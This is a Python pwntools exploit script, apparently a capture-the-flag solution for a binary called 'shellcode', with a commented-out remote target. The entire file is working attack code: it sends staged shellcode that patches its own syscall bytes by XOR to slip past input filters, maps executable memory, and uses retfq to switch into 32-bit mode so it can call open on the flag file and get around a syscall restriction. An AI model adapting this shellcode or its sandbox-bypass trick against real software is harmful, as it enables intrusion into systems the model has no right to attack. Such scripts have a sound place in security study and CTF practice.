#coding:utf-8
from pwn import *
context.log_level = 'debug'
p = process('./shellcode')
# p = remote("nc.eonew.cn","10011")
p.recvuntil("shellcode: ")
append_x86 = '''
push ebx
pop ebx
'''
shellcode_x86 = '''
/*fp = open("flag")*/
mov esp,0x40404140
push 0x67616c66
push esp
pop ebx
xor ecx,ecx
mov eax,5
int 0x80
mov ecx,eax
'''
shellcode_flag = '''
push 0x33
push 0x40404089
retfq
/*read(fp,buf,0x70)*/
mov rdi,rcx
mov rsi,rsp
mov rdx,0x70
xor rax,rax
syscall

/*write(1,buf,0x70)*/
mov rdi,1
mov rax,1
syscall
'''
shellcode_x86 = asm(shellcode_x86)
shellcode_flag = asm(shellcode_flag,arch = 'amd64',os = 'linux')
shellcode = ''
append = '''
push rdx
pop rdx
'''
# 0x40404040 为32位shellcode地址
shellcode_mmap = '''
/*mmap(0x40404040,0x7e,7,34,0,0)*/
push 0x40404040 /*set rdi*/
pop rdi

push 0x7e /*set rsi*/
pop rsi

push 0x40 /*set rdx*/
pop rax
xor al,0x47
push rax
pop rdx

push 0x40 /*set r8*/
pop rax
xor al,0x40
push rax
pop r8

push rax /*set r9*/
pop r9

/*syscall*/
push rbx
pop rax
push 0x5d
pop rcx
xor byte ptr[rax+0x31],cl
push 0x5f
pop rcx
xor byte ptr[rax+0x32],cl

push 0x22 /*set rcx*/
pop rcx

push 0x40/*set rax*/
pop rax
xor al,0x49

'''
shellcode_read = '''
/*read(0,0x40404040,0x70)*/
push 0x40404040
pop rsi
push 0x40
pop rax
xor al,0x40
push rax
pop rdi
xor al,0x40
push 0x70
pop rdx
push rbx
pop rax
push 0x5d
pop rcx
xor byte ptr[rax+0x57],cl
push 0x5f
pop rcx
xor byte ptr[rax+0x58],cl
push rdx
pop rax
xor al,0x70

'''

shellcode_retfq = '''
push rbx
pop rax

xor al,0x40

push 0x72
pop rcx
xor byte ptr[rax+0x40],cl
push 0x68
pop rcx
xor byte ptr[rax+0x40],cl
push 0x47
pop rcx
sub byte ptr[rax+0x41],cl
push 0x48
pop rcx
sub byte ptr[rax+0x41],cl
push rdi
push rdi
push 0x23
push 0x40404040
pop rax
push rax
'''

shellcode += shellcode_mmap
shellcode += append
shellcode += shellcode_read
shellcode += append

shellcode += shellcode_retfq
shellcode += append
shellcode = asm(shellcode,arch = 'amd64',os = 'linux')
print hex(len(shellcode))
# pause()
gdb.attach(p,"b *0x40027f\nb *0x4002eb")
p.sendline(shellcode)
pause()

p.sendline(shellcode_x86 + 0x29*'\x90' + shellcode_flag)
p.interactive()